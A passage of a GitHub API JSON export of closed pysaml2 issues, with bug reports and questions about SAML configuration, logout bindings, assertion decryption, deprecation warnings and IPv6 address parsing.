url_for(\r\n        \"idp_initiated\",\r\n        idp_name=idp_name,\r\n        _external=True)\r\n    https_acs_url = url_for(\r\n        \"idp_initiated\",\r\n        idp_name=idp_name,\r\n        _external=True,\r\n        _scheme='https')\r\n\r\n    #   SAML metadata changes very rarely. On a production system,\r\n    #   this data should be cached as approprate for your production system.\r\n    rv = requests.get(metadata_url_for[idp_name])\r\n\r\n    settings = {\r\n        'entityid': 'https://example.com/sp/metadata',\r\n        'metadata': {\r\n            'inline': [rv.text],\r\n            },\r\n        'service': {\r\n            'sp': {\r\n                'endpoints': {\r\n                    'assertion_consumer_service': [\r\n                        (acs_url, BINDING_HTTP_REDIRECT),\r\n                        (acs_url, BINDING_HTTP_POST),\r\n                        (https_acs_url, BINDING_HTTP_REDIRECT),\r\n                        (https_acs_url, BINDING_HTTP_POST)\r\n                    ],\r\n                },\r\n                # Don't verify that the incoming requests originate from us via\r\n                # the built-in cache for authn request ids in pysaml2\r\n                'allow_unsolicited': True,\r\n                # Don't sign authn requests, since signed requests only make\r\n                # sense in a situation where you control both the SP and IdP\r\n                'authn_requests_signed': False,\r\n                'logout_requests_signed': True,\r\n                'want_assertions_signed': False,\r\n                'want_response_signed': True,\r\n            },\r\n        },\r\n    }\r\n    spConfig = Saml2Config()\r\n    spConfig.load(settings)\r\n    spConfig.allow_unknown_attributes = True\r\n    saml_client = Saml2Client(config=spConfig)\r\n    return saml_client\r\n```\r\n\r\n`metadata_url_for[idp_name]` is my metadata URL from OneLogin.\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/656", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/656/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/656/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/656/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/656", "id": 540573354, "node_id": "MDU6SXNzdWU1NDA1NzMzNTQ=", "number": 656, "title": "pysaml2 imports it's own deprecated module generating a warning", "user": {"login": "rectalogic", "id": 11581, "node_id": "MDQ6VXNlcjExNTgx", "avatar_url": "https://avatars1.githubusercontent.com/u/11581?v=4", "gravatar_id": "", "url": "https://api.github.com/users/rectalogic", "html_url": "https://github.com/rectalogic", "followers_url": "https://api.github.com/users/rectalogic/followers", "following_url": "https://api.github.com/users/rectalogic/following{/other_user}", "gists_url": "https://api.github.com/users/rectalogic/gists{/gist_id}", "starred_url": "https://api.github.com/users/rectalogic/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/rectalogic/subscriptions", "organizations_url": "https://api.github.com/users/rectalogic/orgs", "repos_url": "https://api.github.com/users/rectalogic/repos", "events_url": "https://api.github.com/users/rectalogic/events{/privacy}", "received_events_url": "https://api.github.com/users/rectalogic/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-12-19T21:19:21Z", "updated_at": "2019-12-26T12:44:53Z", "closed_at": "2019-12-26T12:44:53Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n## Code Version\r\n4.9.0\r\n<!-- What version and/or branch of the code are you running? -->\r\n\r\n## Expected Behavior\r\nNo DeprecationWarning\r\n<!--- Tell us what should happen -->\r\n\r\n## Current Behavior\r\n<!--- Tell us what happens instead of the expected behavior -->\r\n```\r\n  /site/venv/lib/python3.7/site-packages/saml2/extension/ui.py:7: DeprecationWarning: saml2.extension.ui is deprecated; use saml2.extension.mdui instead.\r\n    DeprecationWarning,\r\n```\r\n## Possible Solution\r\n<!--- Not obligatory, but suggest a fix/reason for the bug, -->\r\n`load_extensions` should not import `saml2.extension.ui`\r\n\r\n## Steps to Reproduce\r\n<!--- Provide a link to a live example, or an unambiguous set of steps to -->\r\n<!--- reproduce this bug. Include code to reproduce, if relevant -->\r\n1.\r\n```sh-session\r\n$ python -W default::DeprecationWarning:saml2.extension.ui -c 'from saml2 import mdstore; mdstore.load_extensions()'\r\n/site/venv/lib/python3.7/site-packages/saml2/extension/ui.py:7: DeprecationWarning: saml2.extension.ui is deprecated; use saml2.extension.mdui instead.\r\n  DeprecationWarning,\r\n```\r\n\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/652", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/652/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/652/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/652/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/652", "id": 524645213, "node_id": "MDU6SXNzdWU1MjQ2NDUyMTM=", "number": 652, "title": "Question about \"Not for me!!!\" exception", "user": {"login": "nicholasgcoles", "id": 1975028, "node_id": "MDQ6VXNlcjE5NzUwMjg=", "avatar_url": "https://avatars2.githubusercontent.com/u/1975028?v=4", "gravatar_id": "", "url": "https://api.github.com/users/nicholasgcoles", "html_url": "https://github.com/nicholasgcoles", "followers_url": "https://api.github.com/users/nicholasgcoles/followers", "following_url": "https://api.github.com/users/nicholasgcoles/following{/other_user}", "gists_url": "https://api.github.com/users/nicholasgcoles/gists{/gist_id}", "starred_url": "https://api.github.com/users/nicholasgcoles/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/nicholasgcoles/subscriptions", "organizations_url": "https://api.github.com/users/nicholasgcoles/orgs", "repos_url": "https://api.github.com/users/nicholasgcoles/repos", "events_url": "https://api.github.com/users/nicholasgcoles/events{/privacy}", "received_events_url": "https://api.github.com/users/nicholasgcoles/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2019-11-18T22:01:29Z", "updated_at": "2019-11-25T20:33:32Z", "closed_at": "2019-11-20T14:14:15Z", "author_association": "NONE", "active_lock_reason": null, "body": "<!--- Provide a general summary of the issue in the Title above -->\r\nI am getting a strange error (which I am struggling to debug), which raises a `\"Not for me!!!\"` exception. I have inspected the code, and based off this it is quite challenging to understand what exactly would cause this issue.\r\n\r\n## Code Version\r\n4.9.0\r\n<!-- What version and/or branch of the code are you running? -->\r\n\r\n## Expected Behavior\r\nA more verbose error message\r\n<!--- Tell us what should happen -->\r\n\r\n## Current Behavior\r\nA slightly confusing error message\r\n<!--- Tell us what happens instead of the expected behavior -->\r\n\r\n## Possible Solution\r\n<!--- Not obligatory, but suggest a fix/reason for the bug, -->\r\n\r\n## Steps to Reproduce\r\nUnfortunately I don't have steps to reproduce at this stage, but just understanding what this exception is would help me debug my problem.\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/651", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/651/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/651/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/651/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/651", "id": 514202740, "node_id": "MDU6SXNzdWU1MTQyMDI3NDA=", "number": 651, "title": "handle_logout_request bindings", "user": {"login": "rectalogic", "id": 11581, "node_id": "MDQ6VXNlcjExNTgx", "avatar_url": "https://avatars1.githubusercontent.com/u/11581?v=4", "gravatar_id": "", "url": "https://api.github.com/users/rectalogic", "html_url": "https://github.com/rectalogic", "followers_url": "https://api.github.com/users/rectalogic/followers", "following_url": "https://api.github.com/users/rectalogic/following{/other_user}", "gists_url": "https://api.github.com/users/rectalogic/gists{/gist_id}", "starred_url": "https://api.github.com/users/rectalogic/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/rectalogic/subscriptions", "organizations_url": "https://api.github.com/users/rectalogic/orgs", "repos_url": "https://api.github.com/users/rectalogic/repos", "events_url": "https://api.github.com/users/rectalogic/events{/privacy}", "received_events_url": "https://api.github.com/users/rectalogic/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-10-29T20:29:15Z", "updated_at": "2019-11-25T23:45:22Z", "closed_at": "2019-11-25T23:45:22Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n## Code Version\r\nmaster\r\n<!-- What version and/or branch of the code are you running? -->\r\n\r\n## Current Behavior\r\n<!--- Tell us what happens instead of the expected behavior -->\r\n\r\nThe following code in handle_logout_request:\r\nhttps://github.com/IdentityPython/pysaml2/blob/788a695/src/saml2/client.py#L526\r\n\r\n```python\r\n        if binding == BINDING_SOAP:\r\n            response_bindings = [BINDING_SOAP]\r\n        elif binding == BINDING_HTTP_POST or BINDING_HTTP_REDIRECT:\r\n            response_bindings = [BINDING_HTTP_POST, BINDING_HTTP_REDIRECT]\r\n```\r\nWon't `elif binding == BINDING_HTTP_POST or BINDING_HTTP_REDIRECT:` always be True because `BINDING_HTTP_REDIRECT` is a contant string so it will always be True in the `or`.\r\n\r\n## Possible Solution\r\n<!--- Not obligatory, but suggest a fix/reason for the bug, -->\r\nNot sure what this code is trying to do. I would like a way to force a preferred binding for IdP initiated SLO to my SP, currently it picks POST when both redirect and POST are supported by the IdP\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/649", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/649/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/649/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/649/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/649", "id": 509243893, "node_id": "MDU6SXNzdWU1MDkyNDM4OTM=", "number": 649, "title": "DecryptError on parse_assertion", "user": {"login": "sgabb", "id": 31732038, "node_id": "MDQ6VXNlcjMxNzMyMDM4", "avatar_url": "https://avatars2.githubusercontent.com/u/31732038?v=4", "gravatar_id": "", "url": "https://api.github.com/users/sgabb", "html_url": "https://github.com/sgabb", "followers_url": "https://api.github.com/users/sgabb/followers", "following_url": "https://api.github.com/users/sgabb/following{/other_user}", "gists_url": "https://api.github.com/users/sgabb/gists{/gist_id}", "starred_url": "https://api.github.com/users/sgabb/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/sgabb/subscriptions", "organizations_url": "https://api.github.com/users/sgabb/orgs", "repos_url": "https://api.github.com/users/sgabb/repos", "events_url": "https://api.github.com/users/sgabb/events{/privacy}", "received_events_url": "https://api.github.com/users/sgabb/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-10-18T18:27:37Z", "updated_at": "2020-08-07T21:49:46Z", "closed_at": "2020-08-07T21:49:46Z", "author_association": "NONE", "active_lock_reason": null, "body": "<!--- Provide a general summary of the issue in the Title above -->\r\nHi,\r\nwe are trying to implement the library in a python django project but the library fails while trying to decrypt the assertion returned in the response from the Identity Provider.\r\n\r\n## Code Version\r\n4.8.0\r\n\r\n## Expected Behavior\r\nDecypt the saml response from the Identity Provider and get back a AuthnResponse wher identity is not null.\r\n\r\n## Current Behavior\r\nAfter executing **parse_authn_request_response(resp, entity.BINDING_HTTP_POST)** of the Saml2Client(Base) class, and then calling **get_identity()** (AuthnResponse class) we get an empty dict. \r\n\r\nWhile debugging the application to understand the problem, we found out that there is an error here:\r\nhttps://github.com/IdentityPython/pysaml2/blob/25e9dc3b7466572a333a32c03cfc91ef3b9e696f/src/saml2/response.py#L951\r\nThe DecryptError is the following:\r\n**DecryptError('No key was able to decrypt the ciphertext. Keys tried: []',)**\r\n\r\nHere is a partial log of what happens:\r\n\r\n- INFO 337 POST data dict_keys(['SAMLResponse'])\r\n- INFO 663 next url /admin\r\n- INFO 679 status: <ns0:Status xmlns:ns0=\"urn:oasis:names:tc:SAML:2.0:protocol\"><ns0:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\" /></ns0:Status>\r\n- INFO 681 ***Encrypted assertion***\r\n- INFO 682 DecryptError: DecryptError('No key was able to decrypt the ciphertext. Keys tried: []',)\r\n- INFO 683 *** DECRYPTING ASSERTIONS ***\r\n- INFO 683 encrypted_assertion: <saml2.saml.EncryptedAssertion object at 0x7fd98dc5d6a0>\r\n- INFO 684 ***Getting identity***\r\n- INFO 684 AuthnResponse assertions: []\r\n- INFO 685 --- AVA: {}\r\n- INFO 685 Authn_response: <saml2.response.AuthnResponse object at 0x7fd98e5f8278>\r\n- INFO 686 ***Getting identity***\r\n- INFO 687 user_identity = get_identity(): <class 'dict'> - {}\r\n\r\nAny idea of what could the issue?\r\nThanks in advance.\r\n\r\nGabrio\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/643", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/643/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/643/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/643/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/643", "id": 489756912, "node_id": "MDU6SXNzdWU0ODk3NTY5MTI=", "number": 643, "title": "IdP Assertion encryption don't uses SP's metadata certificates", "user": {"login": "peppelinux", "id": 1297620, "node_id": "MDQ6VXNlcjEyOTc2MjA=", "avatar_url": "https://avatars1.githubusercontent.com/u/1297620?v=4", "gravatar_id": "", "url": "https://api.github.com/users/peppelinux", "html_url": "https://github.com/peppelinux", "followers_url": "https://api.github.com/users/peppelinux/followers", "following_url": "https://api.github.com/users/peppelinux/following{/other_user}", "gists_url": "https://api.github.com/users/peppelinux/gists{/gist_id}", "starred_url": "https://api.github.com/users/peppelinux/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/peppelinux/subscriptions", "organizations_url": "https://api.github.com/users/peppelinux/orgs", "repos_url": "https://api.github.com/users/peppelinux/repos", "events_url": "https://api.github.com/users/peppelinux/events{/privacy}", "received_events_url": "https://api.github.com/users/peppelinux/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 0, "created_at": "2019-09-05T13:29:43Z", "updated_at": "2020-05-04T19:50:17Z", "closed_at": "2020-05-04T19:50:17Z", "author_association": "MEMBER", "active_lock_reason": null, "body": "## Code Version\r\ncurrent master branch, v4.8.0 and previous\r\n\r\n## Expected Behavior\r\nThe Assertion should be encrypted with SP's certificate and not with IdP encryption key. Otherwise it should be configurable: choose wich certificate to use (as it seems to have been developed).\r\n\r\n## Current Behavior\r\nEven if `encrypt_cert_assertion` and `encrypt_cert_advice` are passed to `saml2.server.Server._authn_response` or `saml2.entity._response`, with for example the sp  metadata encryption certificates, the authn Response always being encrypted with IdP's encryption keys.\r\n\r\nLooking in the code the behaviour should not be this, so I hope to be wrong and that the solution is easy.\r\n\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/642", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/642/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/642/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/642/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/642", "id": 489649109, "node_id": "MDU6SXNzdWU0ODk2NDkxMDk=", "number": 642, "title": "Bind to all interfaces", "user": {"login": "stdedos", "id": 133706, "node_id": "MDQ6VXNlcjEzMzcwNg==", "avatar_url": "https://avatars1.githubusercontent.com/u/133706?v=4", "gravatar_id": "", "url": "https://api.github.com/users/stdedos", "html_url": "https://github.com/stdedos", "followers_url": "https://api.github.com/users/stdedos/followers", "following_url": "https://api.github.com/users/stdedos/following{/other_user}", "gists_url": "https://api.github.com/users/stdedos/gists{/gist_id}", "starred_url": "https://api.github.com/users/stdedos/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/stdedos/subscriptions", "organizations_url": "https://api.github.com/users/stdedos/orgs", "repos_url": "https://api.github.com/users/stdedos/repos", "events_url": "https://api.github.com/users/stdedos/events{/privacy}", "received_events_url": "https://api.github.com/users/stdedos/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-09-05T09:52:46Z", "updated_at": "2019-10-01T14:04:24Z", "closed_at": "2019-10-01T14:04:24Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n## Code Version\r\nLatest released\r\n<!-- What version and/or branch of the code are you running? -->\r\n\r\n## Expected Behavior\r\nWould it be possible to bind to all interfaces?\r\n<!--- Tell us what should happen -->\r\n\r\n## Current Behavior\r\n0.0.0.0 does not match `$senders_ip`\r\n<!--- Tell us what happens instead of the expected behavior -->\r\n\r\n## Possible Solution\r\n<!--- Not obligatory, but suggest a fix/reason for the bug, -->\r\n\r\n## Steps to Reproduce\r\n<!--- Provide a link to a live example, or an unambiguous set of steps to -->\r\n<!--- reproduce this bug. Include code to reproduce, if relevant -->\r\n1.\r\n2.\r\n3.\r\n4.\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/635", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/635/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/635/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/635/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/635", "id": 482252818, "node_id": "MDU6SXNzdWU0ODIyNTI4MTg=", "number": 635, "title": "create_logout_request() correct usage", "user": {"login": "PaulKovalov", "id": 40391586, "node_id": "MDQ6VXNlcjQwMzkxNTg2", "avatar_url": "https://avatars3.githubusercontent.com/u/40391586?v=4", "gravatar_id": "", "url": "https://api.github.com/users/PaulKovalov", "html_url": "https://github.com/PaulKovalov", "followers_url": "https://api.github.com/users/PaulKovalov/followers", "following_url": "https://api.github.com/users/PaulKovalov/following{/other_user}", "gists_url": "https://api.github.com/users/PaulKovalov/gists{/gist_id}", "starred_url": "https://api.github.com/users/PaulKovalov/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/PaulKovalov/subscriptions", "organizations_url": "https://api.github.com/users/PaulKovalov/orgs", "repos_url": "https://api.github.com/users/PaulKovalov/repos", "events_url": "https://api.github.com/users/PaulKovalov/events{/privacy}", "received_events_url": "https://api.github.com/users/PaulKovalov/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-08-19T11:19:21Z", "updated_at": "2019-08-20T11:15:41Z", "closed_at": "2019-08-20T11:15:41Z", "author_association": "NONE", "active_lock_reason": null, "body": "I use pysaml2 version 4.8.0 to implement SSO and SLO service, currently im stuck with creating logout request, The way i'm doing it is as follows:\r\n\r\n```if not request.user.is_anonymous:\r\n            saml2_client = _get_saml_client() # this works good for SSO, here it has changed endpoint of entityid\r\n            rid, logout_request = saml2_client.create_logout_request(\r\n            destination=identity_provider_endpoint,\r\n            name_id=request.user.email, # we use email for nameID\r\n            issuer_entity_id=\"https://localhost:8000/saml2_logout/\",\r\n            )\r\n            print(logout_request.verify()) # this causes AttributeError, 'str' object has no attribute 'verify'\r\n            return HttpResponseRedirect(logout_request) # this causes quote_from_bytes() expected bytes\r\n```\r\nfor some reason create_logout_request returns str object, however when I try to print it\r\n` print(logout_request)`\r\nI'm getting `'str' object has no attribute 'become_child_element_of'` \r\nI couldn't find any documentation on how to create logout request, any help will be much appreciated", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/630", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/630/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/630/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/630/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/630", "id": 481457713, "node_id": "MDU6SXNzdWU0ODE0NTc3MTM=", "number": 630, "title": "List of IdP example is broken in docs.", "user": {"login": "zehuanli", "id": 22104836, "node_id": "MDQ6VXNlcjIyMTA0ODM2", "avatar_url": "https://avatars3.githubusercontent.com/u/22104836?v=4", "gravatar_id": "", "url": "https://api.github.com/users/zehuanli", "html_url": "https://github.com/zehuanli", "followers_url": "https://api.github.com/users/zehuanli/followers", "following_url": "https://api.github.com/users/zehuanli/following{/other_user}", "gists_url": "https://api.github.com/users/zehuanli/gists{/gist_id}", "starred_url": "https://api.github.com/users/zehuanli/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/zehuanli/subscriptions", "organizations_url": "https://api.github.com/users/zehuanli/orgs", "repos_url": "https://api.github.com/users/zehuanli/repos", "events_url": "https://api.github.com/users/zehuanli/events{/privacy}", "received_events_url": "https://api.github.com/users/zehuanli/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 0, "created_at": "2019-08-16T06:13:22Z", "updated_at": "2019-08-20T08:29:32Z", "closed_at": "2019-08-20T08:29:32Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "The list of IdP examples is not properly rendered in [An extremly simple example of a SAML2 identity provider](https://pysaml2.readthedocs.io/en/latest/examples/idp.html). The first item is not recognized due to lack of an empty line between the list and the preceding text.\r\n\r\n## Code Version\r\nNot related\r\n\r\n## Expected Behavior\r\nThe text `idp2 has a static definition of users:` should be shown as an item in the list.\r\n\r\n## Current Behavior\r\nThe list is broken and the markdown symbol `*` is not rendered.\r\n\r\n## Possible Solution\r\nJust add an empty line on the top of the list.\r\n\r\n## Steps to Reproduce\r\nNot related\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/629", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/629/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/629/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/629/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/629", "id": 478461647, "node_id": "MDU6SXNzdWU0Nzg0NjE2NDc=", "number": 629, "title": "Temporary files not removed", "user": {"login": "tpazderka", "id": 7734753, "node_id": "MDQ6VXNlcjc3MzQ3NTM=", "avatar_url": "https://avatars3.githubusercontent.com/u/7734753?v=4", "gravatar_id": "", "url": "https://api.github.com/users/tpazderka", "html_url": "https://github.com/tpazderka", "followers_url": "https://api.github.com/users/tpazderka/followers", "following_url": "https://api.github.com/users/tpazderka/following{/other_user}", "gists_url": "https://api.github.com/users/tpazderka/gists{/gist_id}", "starred_url": "https://api.github.com/users/tpazderka/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/tpazderka/subscriptions", "organizations_url": "https://api.github.com/users/tpazderka/orgs", "repos_url": "https://api.github.com/users/tpazderka/repos", "events_url": "https://api.github.com/users/tpazderka/events{/privacy}", "received_events_url": "https://api.github.com/users/tpazderka/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-08-08T13:09:41Z", "updated_at": "2019-11-26T12:13:45Z", "closed_at": "2019-11-26T12:13:45Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "## Code Version\r\n4.7.0\r\n## Expected Behavior\r\nClean up the no longer necessary files.\r\n## Current Behavior\r\nCalling `entitites_descriptor` leaves files on disc (2 per call).\r\n## Possible Solution\r\n`make_temp` function creates the temporary files marked as for deletion and passes file descriptor to the caller. It should be possible to just close the file when no longer needed.\r\n## Steps to Reproduce\r\n1. Call `entities_descriptor` to create a valid XML\r\n2. Inspect temporary file storage", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/627", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/627/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/627/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/627/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/627", "id": 474521312, "node_id": "MDU6SXNzdWU0NzQ1MjEzMTI=", "number": 627, "title": "Support enclosing the IPv6 address in brackets", "user": {"login": "William-Francis", "id": 1825857, "node_id": "MDQ6VXNlcjE4MjU4NTc=", "avatar_url": "https://avatars1.githubusercontent.com/u/1825857?v=4", "gravatar_id": "", "url": "https://api.github.com/users/William-Francis", "html_url": "https://github.com/William-Francis", "followers_url": "https://api.github.com/users/William-Francis/followers", "following_url": "https://api.github.com/users/William-Francis/following{/other_user}", "gists_url": "https://api.github.com/users/William-Francis/gists{/gist_id}", "starred_url": "https://api.github.com/users/William-Francis/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/William-Francis/subscriptions", "organizations_url": "https://api.github.com/users/William-Francis/orgs", "repos_url": "https://api.github.com/users/William-Francis/repos", "events_url": "https://api.github.com/users/William-Francis/events{/privacy}", "received_events_url": "https://api.github.com/users/William-Francis/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2019-07-30T11:08:27Z", "updated_at": "2019-11-26T10:36:15Z", "closed_at": "2019-11-26T10:36:15Z", "author_association": "NONE", "active_lock_reason": null, "body": "Shibboleth provider sends IPv6 address in brackets, like:\r\n```\r\n <saml2:SubjectConfirmationData Address=\"[2001:8003:5555:9999:555a:5555:c77:d5c5]\" InResponseTo=\"xxx\" NotOnOrAfter=\"2019-07-02T12:12:12.966Z\" Recipient=\"xxx\"/>\r\n```\r\n\r\nThe standard they are using is defined here: https://tools.ietf.org/html/rfc4038#section-5.1\r\nin short: \r\n\"The IP address parsers should support enclosing the IPv6 address in brackets, even when the address is not used in conjunction with a port number.\"\r\n\r\n\r\n## Code Version\r\nMaster:\r\nhttps://github.com/IdentityPython/pysaml2/blob/master/src/saml2/saml.py#L982\r\n\r\n## Expected Behavior\r\n\r\nCheck if the address is in brackets, and run the valid_ipv6() function on the item inside the list, then pass.\r\n\r\n## Current Behavior\r\n\r\nraise ShouldValueError(\"Not an IPv4 or IPv6 address\")\r\n\r\n\r\n## Possible Solution\r\nMaybe not the most optimal, but should work.\r\nIt would also be possible to extract the item from the list before assigning self.address in the constructor function.\r\n```\r\n    def verify(self):\r\n        if self.address:\r\n            # dotted-decimal IPv4 or RFC3513 IPv6 address\r\n            if valid_ipv4(self.address) or valid_ipv6(self.address):\r\n                pass\r\n            elif (isinstance(self.address, list) and self.address[0] and valid_ipv6(self.address[0])):\r\n                pass\r\n            else:\r\n                raise ShouldValueError(\"Not an IPv4 or IPv6 address\")\r\n        elif self.dns_name:\r\n            valid_domain_name(self.dns_name)\r\n        return SubjectLocalityType_.verify(self)\r\n```\r\n## Steps to Reproduce\r\n<saml2:SubjectConfirmationData Address=\"[2001:8003:5555:9999:555a:5555:c77:d5c5]\" InResponseTo=\"xxx\" NotOnOrAfter=\"2019-07-02T12:12:12.966Z\" Recipient=\"xxx\"/>\r\nSend through address with IPv6 in brackets.\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/624", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/624/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/624/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/624/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/624", "id": 459547894, "node_id": "MDU6SXNzdWU0NTk1NDc4OTQ=", "number": 624, "title": "ACS URL fails if a trailing slash(/) is added", "user": {"login": "arvind008", "id": 9160770, "node_id": "MDQ6VXNlcjkxNjA3NzA=", "avatar_url": "https://avatars0.githubusercontent.com/u/9160770?v=4", "gravatar_id": "", "url": "https://api.github.com/users/arvind008", "html_url": "https://github.com/arvind008", "followers_url": "https://api.github.com/users/arvind008/followers", "following_url": "https://api.github.com/users/arvind008/following{/other_user}", "gists_url": "https://api.github.com/users/arvind008/gists{/gist_id}", "starred_url": "https://api.github.com/users/arvind008/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/arvind008/subscriptions", "organizations_url": "https://api.github.com/users/arvind008/orgs", "repos_url": "https://api.github.com/users/arvind008/repos", "events_url": "https://api.github.com/users/arvind008/events{/privacy}", "received_events_url": "https://api.github.com/users/arvind008/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 5, "created_at": "2019-06-23T08:00:31Z", "updated_at": "2020-05-04T21:56:55Z", "closed_at": "2020-05-04T21:56:55Z", "author_association": "NONE", "active_lock_reason": null, "body": "I have configured the ACS in IDP as 